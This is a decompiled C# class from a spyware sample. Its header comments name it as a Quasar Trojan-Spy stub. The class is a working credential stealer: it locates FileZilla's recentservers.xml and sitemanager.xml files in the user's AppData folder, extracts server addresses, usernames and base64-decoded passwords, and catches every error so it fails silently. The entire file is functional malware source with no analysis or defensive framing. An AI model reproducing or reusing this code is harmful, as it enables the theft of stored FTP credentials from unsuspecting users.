// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Recovery.gg3d
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace NoiseMe.Drags.App.Data.Recovery
{
  public class gg3d : GH9kf<FtpCredential>
  {
    public List<FtpCredential> EnumerateData()
    {
      List<FtpCredential> ftpCredentialList = new List<FtpCredential>();
      try
      {
        string str1 = string.Format("{0}\\FileZilla\\recentservers.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        string str2 = string.Format("{0}\\FileZilla\\sitemanager.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        if (File.Exists(str1))
          ftpCredentialList.AddRange((IEnumerable<FtpCredential>) gg3d.FFFTp(str1));
        if (File.Exists(str2))
          ftpCredentialList.AddRange((IEnumerable<FtpCredential>) gg3d.FFFTp(str2));
        return ftpCredentialList;
      }
      catch
      {
      }
      return ftpCredentialList;
    }

    public static List<FtpCredential> FFFTp(string Path)
    {
      List<FtpCredential> ftpCredentialList = new List<FtpCredential>();
      try
      {
        XmlTextReader reader = new XmlTextReader(Path);
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load((XmlReader) reader);
        foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
        {
          FtpCredential ftpCredential = gg3d.Rcnt(childNode);
          if (ftpCredential.Username != "UNKNOWN" && ftpCredential.Server != "UNKNOWN")
            ftpCredentialList.Add(ftpCredential);
        }
      }
      catch
      {
      }
      return ftpCredentialList;
    }

    public static FtpCredential Rcnt(XmlNode xmlNode)
    {
      FtpCredential ftpCredential = new FtpCredential();
      try
      {
        foreach (XmlNode childNode in xmlNode.ChildNodes)
        {
          if (childNode.Name == "Host")
            ftpCredential.Server = childNode.InnerText;
          if (childNode.Name == "Port")
            ftpCredential.Server = ftpCredential.Server + ":" + childNode.InnerText;
          if (childNode.Name == "User")
            ftpCredential.Username = childNode.InnerText;
          if (childNode.Name == "Pass")
            ftpCredential.Password = gg3d.Base64Decode(childNode.InnerText);
        }
      }
      catch
      {
      }
      finally
      {
        ftpCredential.Username = string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username;
        ftpCredential.Server = string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server;
        ftpCredential.Password = string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password;
      }
      return ftpCredential;
    }

    public static FtpCredential MngCred(XmlNode xmlNode)
    {
      FtpCredential ftpCredential = new FtpCredential();
      try
      {
        foreach (XmlNode childNode in xmlNode.ChildNodes)
        {
          if (childNode.Name == "Host")
            ftpCredential.Server = childNode.InnerText;
          if (childNode.Name == "Port")
            ftpCredential.Server = ftpCredential.Server + ":" + childNode.InnerText;
          if (childNode.Name == "User")
            ftpCredential.Username = childNode.InnerText;
          if (childNode.Name == "Pass")
            ftpCredential.Password = gg3d.Base64Decode(childNode.InnerText);
        }
      }
      catch
      {
      }
      finally
      {
        ftpCredential.Username = string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username;
        ftpCredential.Server = string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server;
        ftpCredential.Password = string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password;
      }
      return ftpCredential;
    }

    public static string Base64Decode(string input)
    {
      try
      {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
      }
      catch
      {
        return input;
      }
    }
  }
}
